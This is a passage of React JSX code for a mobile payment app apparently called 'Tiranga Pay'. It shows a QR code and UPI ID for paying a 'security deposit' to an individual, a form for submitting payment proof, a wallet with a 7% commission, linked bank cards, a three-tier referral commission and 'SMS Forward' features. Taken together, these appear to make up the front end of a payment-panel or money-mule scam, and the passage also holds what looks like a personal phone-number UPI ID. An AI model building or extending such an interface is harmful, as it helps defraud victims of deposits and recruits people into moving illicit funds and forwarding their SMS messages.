          {/* Payment Method Switcher */}
          <div className="payment-tabs">
            <button
              type="button"
              className={`payment-tab-btn ${paymentMode === 'upi' ? 'active' : ''}`}
              onClick={() => setPaymentMode('upi')}
            >
              <i className="fas fa-qrcode" style={{ color: '#16a34a' }}></i> UPI
            </button>
            <button
              type="button"
              className={`payment-tab-btn ${paymentMode === 'bank' ? 'active' : ''}`}
              onClick={() => setPaymentMode('bank')}
            >
              <i className="fas fa-university" style={{ color: '#f59e0b' }}></i> Direct Bank
            </button>
          </div>

          {/* QR Code Container (Photo 4) */}
          <div className="qr-code-card">
            <div className="qr-merchant-name">
              <span>ABHIJEET</span>
              <i className="fas fa-check-circle verified-blue-check"></i>
            </div>

            <div className="qr-image-wrapper">
              <img
                src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent('upi://pay?pa=9685318069@mairtel&pn=ABHIJEET&cu=INR')}`}
                alt="Payment QR"
              />
            </div>

            <div className="scan-tag-text">
              SCAN TO PAY SECURITY DEPOSIT
            </div>

            <div className="upi-copy-box">
              <span className="upi-id-text">UPI: 9685318069@mairtel</span>
              <button type="button" className="upi-copy-btn" onClick={handleCopyUPI}>
                <i className="fas fa-copy"></i> Copy
              </button>
            </div>
          </div>

          {/* Submit Payment Proof Card (Photo 5) */}
          <div className="white-card" style={{ position: 'relative', paddingTop: '28px' }}>
            <div style={{
              position: 'absolute',
              top: '-14px',
              left: '16px',
              background: '#082f6e',
              color: '#ffffff',
              padding: '5px 16px',
              borderRadius: '9999px',
              fontSize: '11px',
              fontWeight: 800,
              textTransform: 'uppercase',
              letterSpacing: '0.04em'
            }}>
              SUBMIT PAYMENT PROOF
            </div>

            {depositMsg && (
              <div className="auth-alert-box" style={{ background: '#f0fdf4', color: '#16a34a', border: '1px solid #bbf7d0' }}>
                <i className="fas fa-check-circle"></i>
                <span>{depositMsg}</span>
              </div>
            )}

            <form onSubmit={handleSubmitDeposit}>
              {/* UTR Number */}
              <div style={{ marginBottom: '16px' }}>
                <label style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '12px', fontWeight: 800, color: '#f59e0b', marginBottom: '6px' }}>
                  <span>#</span> ENTER 12-DIGIT UTR NUMBER
                </label>
                <input
                  type="text"
                  className="app-input-field"
                  placeholder="e.g. 3124xxxxxxxx"
                  value={utrNumber}
                  onChange={(e) => setUtrNumber(e.target.value)}
                  required
                />
              </div>

              {/* Upload Payment Slip */}
              <div style={{ marginBottom: '20px' }}>
                <label style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '12px', fontWeight: 800, color: '#16a34a', marginBottom: '6px' }}>
                  <i className="fas fa-image"></i> UPLOAD PAYMENT SLIP
                </label>

                <div style={{
                  border: '1.5px dashed #cbd5e1',
                  borderRadius: '12px',
                  padding: '16px',
                  background: '#f8fafc',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px'
                }}>
                  <label style={{
                    background: '#e0e7ff',
                    color: '#3730a3',
                    padding: '8px 16px',
                    borderRadius: '8px',
                    fontWeight: 700,
                    fontSize: '13px',
                    cursor: 'pointer'
                  }}>
                    Choose File
                    <input
                      type="file"
                      accept="image/*"
                      style={{ display: 'none' }}
                      onChange={(e) => {
                        const file = e.target.files?.[0]
                        if (file) setSelectedFileName(file.name)
                      }}
                    />
                  </label>
                  <span style={{ fontSize: '13px', color: '#64748b' }}>{selectedFileName}</span>
                </div>

                <p style={{ fontSize: '11px', color: '#94a3b8', marginTop: '6px', lineHeight: '1.4' }}>
                  <i className="fas fa-info-circle"></i> Ensure the UTR and amount are clearly visible in the screenshot.
                </p>
              </div>

              <button type="submit" className="green-action-btn" disabled={loading}>
                {loading ? 'Submitting Details...' : 'SUBMIT DETAILS'}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* --- MAIN TABS --- */}

      {/* TAB 1: EXACT HOME SCREEN (Photo 6 - media_1793681549669_b532bf5e.jpg) */}
      {subScreen === 'none' && activeTab === 'home' && (
        <div style={{ padding: '16px' }}>
          {/* Total Wallet Balance Card */}
          <div className="home-wallet-card">
            <div className="wallet-card-header">
              <span className="wallet-title-text">
                Total Wallet Balance (7% Comm.)
              </span>
              <span className="wallet-level-badge">
                Level: V1
              </span>
            </div>

            <div className="wallet-balance-amount">
              ₹ {(profile?.wallet_balance ?? 0).toFixed(2)}
            </div>

            <div className="wallet-pill-buttons">
              <button
                type="button"
                className="pill-comm-btn"
                onClick={() => showToast('Commission rate is flat 7% on all transactions.')}
              >
                <i className="fa-solid fa-bolt"></i> Commission 7%
              </button>

              <button
                type="button"
                className="pill-withdraw-btn"
                onClick={() => setSubScreen('withdraw')}
              >
                <i className="fa-solid fa-wallet"></i> Withdrawal
              </button>
            </div>
          </div>

          {/* Section: My Linked Bank Cards */}
          <h3 className="home-section-title">My Linked Bank Cards</h3>
          
          <div className="bank-card-container">
            <div className="bank-card-top">
              <span className="bank-card-name">
                {userBank?.bank_name || 'INDUSIND BANK'}
              </span>
              <span className="bank-status-pill">
                {userBank?.status || 'PENDING'}
              </span>
            </div>

            <div className="bank-card-digits">
              • • • • &nbsp; {userBank?.account_number ? userBank.account_number.slice(-4) : '2 1 0 7'}
            </div>

            <div className="bank-card-bottom">
              <div>
                <span className="card-holder-label">CARD HOLDER NAME</span>
                <div className="card-holder-val">
                  {userBank?.holder_name || 'VIKRAM KUMAR'}
                </div>
              </div>

              <button
                type="button"
                className="card-edit-btn"
                onClick={() => setSubScreen('bank_setup')}
                title="Edit Card Details"
              >
                <i className="fas fa-pencil-alt"></i>
              </button>
            </div>
          </div>

          <button
            type="button"
            className="add-card-dashed-btn"
            onClick={() => setSubScreen('bank_setup')}
          >
            + Add another card
          </button>

          {/* Section: Main Features */}
          <h3 className="home-section-title" style={{ marginTop: '24px' }}>Main Features</h3>

          <div className="main-features-box">
            {/* 1. Security Deposit */}
            <div className="feature-btn-item" onClick={() => setSubScreen('deposit')}>
              <div className="feature-round-icon icon-blue-shield">
                <i className="fa-solid fa-shield-halved"></i>
              </div>
              <span className="feature-label-text">
                Security<br />Deposit
              </span>
            </div>

            {/* 2. Add Bank */}
            <div className="feature-btn-item" onClick={() => setSubScreen('bank_setup')}>
              <div className="feature-round-icon icon-green-bank">
                <i className="fa-solid fa-landmark"></i>
              </div>
              <span className="feature-label-text">
                Add Bank
              </span>
            </div>

            {/* 3. Withdrawal */}
            <div className="feature-btn-item" onClick={() => setSubScreen('withdraw')}>
              <div className="feature-round-icon icon-purple-withdraw">
                <i className="fa-solid fa-hand-holding-dollar"></i>
              </div>
              <span className="feature-label-text">
                Withdrawal
              </span>
            </div>

            {/* 4. SMS Forward */}
            <div className="feature-btn-item" onClick={() => setSubScreen('sms')}>
              <div className="feature-round-icon icon-gray-sms">
                <i className="fa-solid fa-comment-sms"></i>
              </div>
              <span className="feature-label-text">
                SMS<br />Forward
              </span>
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: TRANSACTIONS LIST */}
      {subScreen === 'none' && activeTab === 'transactions' && (
        <div style={{ padding: '16px' }}>
          <h2 style={{ fontSize: '18px', fontWeight: 900, color: '#082f6e', marginBottom: '16px' }}>
            All Transactions
          </h2>

          <div style={{ marginBottom: '20px' }}>
            <h4 style={{ fontSize: '13px', fontWeight: 800, color: '#00A3E0', textTransform: 'uppercase', marginBottom: '10px' }}>
              Deposit Submissions ({depositsList.length})
            </h4>
            {depositsList.length === 0 ? (
              <div className="white-card" style={{ textAlign: 'center', color: '#94a3b8', fontSize: '13px' }}>
                No deposits yet.
              </div>
            ) : (
              depositsList.map((dep) => (
                <div key={dep.id} className="white-card" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px', marginBottom: '10px' }}>
                  <div>
                    <h5 style={{ fontWeight: 800, color: '#082f6e', fontSize: '14px' }}>₹{dep.amount.toFixed(2)} ({dep.account_type})</h5>
                    <p style={{ fontSize: '11px', color: '#64748b' }}>UTR: {dep.utr_number}</p>
                    <span style={{ fontSize: '10px', color: '#94a3b8' }}>{new Date(dep.created_at).toLocaleString()}</span>
                  </div>
                  <span style={{
                    padding: '4px 10px',
                    borderRadius: '8px',
                    fontSize: '11px',
                    fontWeight: 800,
                    textTransform: 'uppercase',
                    background: dep.status === 'approved' ? '#dcfce7' : '#fef9c3',
                    color: dep.status === 'approved' ? '#15803d' : '#854d0e'
                  }}>
                    {dep.status}
                  </span>
                </div>
              ))
            )}
          </div>

          <div>
            <h4 style={{ fontSize: '13px', fontWeight: 800, color: '#00A3E0', textTransform: 'uppercase', marginBottom: '10px' }}>
              Withdrawal Requests ({withdrawalsList.length})
            </h4>
            {withdrawalsList.length === 0 ? (
              <div className="white-card" style={{ textAlign: 'center', color: '#94a3b8', fontSize: '13px' }}>
                No withdrawals yet.
              </div>
            ) : (
              withdrawalsList.map((w) => (
                <div key={w.id} className="white-card" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px', marginBottom: '10px' }}>
                  <div>
                    <h5 style={{ fontWeight: 800, color: '#082f6e', fontSize: '14px' }}>₹{w.amount.toFixed(2)}</h5>
                    <p style={{ fontSize: '11px', color: '#64748b' }}>{w.bank_account_info}</p>
                    <span style={{ fontSize: '10px', color: '#94a3b8' }}>{new Date(w.created_at).toLocaleString()}</span>
                  </div>
                  <span style={{
                    padding: '4px 10px',
                    borderRadius: '8px',
                    fontSize: '11px',
                    fontWeight: 800,
                    textTransform: 'uppercase',
                    background: w.status === 'approved' ? '#dcfce7' : '#fef9c3',
                    color: w.status === 'approved' ? '#15803d' : '#854d0e'
                  }}>
                    {w.status}
                  </span>
                </div>
              ))
            )}
          </div>
        </div>
      )}

      {/* TAB 3: PROFILE SCREEN (Photo 3) */}
      {subScreen === 'none' && activeTab === 'profile' && (
        <div style={{ padding: '16px' }}>
          {/* Top 4 Shortcuts Row matching Photo 3 */}
          <div className="profile-shortcuts-row">
            {/* 1. Deposit Record */}
            <div className="shortcut-item" onClick={() => { setActiveTab('transactions') }}>
              <div className="shortcut-icon-box" style={{ background: '#e0f2fe', color: '#0284c7' }}>
                <i className="fas fa-file-invoice-dollar"></i>
              </div>
              <span className="shortcut-title">Deposit Record</span>
            </div>

            {/* 2. Withdraw Record */}
            <div className="shortcut-item" onClick={() => { setSubScreen('withdraw') }}>
              <div className="shortcut-icon-box" style={{ background: '#f3e8ff', color: '#a855f7' }}>
                <i className="fas fa-receipt"></i>
              </div>
              <span className="shortcut-title">Withdraw Record</span>
            </div>

            {/* 3. My Team */}
            <div className="shortcut-item" onClick={() => alert(`My Team Level: 3-Tier Commission (Level 1: 30%, Level 2: 20%, Level 3: 10%). Your Invite Code: ${profile?.invite_code || 'VIP100'}`)}>
              <div className="shortcut-icon-box" style={{ background: '#ffedd5', color: '#f97316' }}>
                <i className="fas fa-users"></i>
              </div>
              <span className="shortcut-title">My Team</span>
            </div>

            {/* 4. VIP Level */}
            <div className="shortcut-item" onClick={() => alert('VIP Level 1 Active! Flat 7% Commission Rate.')}>
              <div className="shortcut-icon-box" style={{ background: '#fef9c3', color: '#eab308' }}>
                <i className="fas fa-crown"></i>
              </div>
              <span className="shortcut-title">VIP Level</span>
            </div>
          </div>

          {/* Profile Menu List matching Photo 3 */}
          <div className="profile-menu-card">
            {/* My Bank Cards */}
            <div className="profile-menu-item" onClick={() => setSubScreen('bank_setup')}>
              <div className="profile-item-left">
                <div className="profile-item-icon" style={{ background: '#ecfdf5', color: '#10b981' }}>
                  <i className="fas fa-credit-card"></i>
                </div>
                <span className="profile-item-name">My Bank Cards</span>
              </div>
              <i className="fas fa-chevron-right profile-item-chevron"></i>
            </div>

            {/* Withdrawal Bank */}
            <div className="profile-menu-item" onClick={() => setSubScreen('withdraw')}>
              <div className="profile-item-left">
                <div className="profile-item-icon" style={{ background: '#eff6ff', color: '#3b82f6' }}>
                  <i className="fas fa-university"></i>
                </div>
                <span className="profile-item-name">Withdrawal Bank</span>
              </div>
              <i className="fas fa-chevron-right profile-item-chevron"></i>
            </div>

            {/* SMS Forwarder */}
            <div className="profile-menu-item" onClick={() => setSubScreen('sms')}>
              <div className="profile-item-left">
                <div className="profile-item-icon" style={{ background: '#f1f5f9', color: '#475569' }}>
                  <i className="fas fa-comment-sms"></i>
                </div>
                <span className="profile-item-name">SMS Forwarder</span>
              </div>
              <i className="fas fa-chevron-right profile-item-chevron"></i>
            </div>

            {/* Invite Friends */}
            <div className="profile-menu-item" onClick={() => {
              navigator.clipboard.writeText(window.location.origin + window.location.pathname)
              showToast('Referral link copied to clipboard!')
            }}>
              <div className="profile-item-left">
                <div className="profile-item-icon" style={{ background: '#fff7ed', color: '#f97316' }}>
                  <i className="fas fa-user-plus"></i>
                </div>
                <span className="profile-item-name">Invite Friends</span>
              </div>
              <i className="fas fa-chevron-right profile-item-chevron"></i>
            </div>

            {/* Help & Support */}
            <div className="profile-menu-item" onClick={() => alert('Customer Support 24/7 is ready to assist you: support@tirangapaypanel.in')}>
              <div className="profile-item-left">
                <div className="profile-item-icon" style={{ background: '#ecfeff', color: '#06b6d4' }}>
                  <i className="fa-solid fa-headset"></i>
                </div>
                <span className="profile-item-name">Help & Support</span>
              </div>
              <i className="fas fa-chevron-right profile-item-chevron"></i>
            </div>

            {/* Change Password */}
            <div className="profile-menu-item" onClick={() => alert('Password reset instructions will be sent to your registered email: ' + user.email)}>
              <div className="profile-item-left">
                <div className="profile-item-icon" style={{ background: '#faf5ff', color: '#a855f7' }}>
                  <i className="fas fa-lock"></i>
                </div>
                <span className="profile-item-name">Change Password</span>
              </div>
              <i className="fas fa-chevron-right profile-item-chevron"></i>
            </div>

            {/* Secure Logout */}
            <div className="profile-menu-item" onClick={handleLogout}>
              <div className="profile-item-left">
                <div className="profile-item-icon" style={{ background: '#fef2f2', color: '#ef4444' }}>
                  <i className="fas fa-sign-out-alt"></i>
                </div>
                <span className="profile-item-name" style={{ color: '#ef4444' }}>Secure Logout</span>
              </div>
              <i className="fas fa-chevron-right profile-item-chevron"></i>
            </div>
          </div>

          {/* Version Subtext matching Photo 3 */}
          <div style={{ textAlign: 'center', marginTop: '20px', color: '#94a3b8', fontSize: '11px', fontWeight: 800, letterSpacing: '0.08em' }}>
            TIRANGA PAY V2.5.0
          </div>
        </div>
      )}

      {/* BOTTOM NAVIGATION BAR (Home, Transactions, Profile) matching all photos */}
      <nav className="app-bottom-nav">
        <button
          type="button"
          className={`bottom-tab-btn ${activeTab === 'home' && subScreen === 'none' ? 'active' : ''}`}
          onClick={() => {
            setSubScreen('none')
            setActiveTab('home')
          }}
        >
          <i className="fas fa-home"></i>
          <span>Home</span>
        </button>

        <button
          type="button"
          className={`bottom-tab-btn ${activeTab === 'transactions' && subScreen === 'none' ? 'active' : ''}`}
          onClick={() => {
            setSubScreen('none')
            setActiveTab('transactions')
          }}
        >
          <i className="fas fa-list-alt"></i>
          <span>Transactions</span>
        </button>

        <button
          type="button"
          className={`bottom-tab-btn ${activeTab === 'profile' && subScreen === 'none' ? 'active' : ''}`}
          onClick={() => {
            setSubScreen('none')
            setActiveTab('profile')
          }}
        >
          <i className="fas fa-user-circle"></i>
          <span>Profile</span>
        </button>
      </nav>
    </div>
  )
}
